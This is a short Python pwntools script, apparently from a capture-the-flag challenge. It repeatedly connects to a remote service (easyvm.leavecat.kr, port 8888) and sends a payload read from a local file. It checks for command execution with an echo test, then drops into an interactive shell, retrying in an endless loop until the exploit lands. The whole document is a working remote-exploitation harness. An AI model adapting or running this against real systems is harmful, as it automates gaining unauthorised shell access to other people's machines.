from pwn import *

def exp():
	p = remote("easyvm.leavecat.kr", 8888)
	p.sendlineafter(">> ", pay)
	try:
		p.sendline("echo 'i pwned you'")
		p.recvuntil("i pwned you", timeout=2)
		p.interactive()
	except:
		log.failure("shit")
		p.close()
	

with open("exploit","r") as f:
	pay = f.read()
	i = 1
	context.log_level = 'debug'
	while(1):
		log.info("try %d"%i)
		exp()
		i+=1
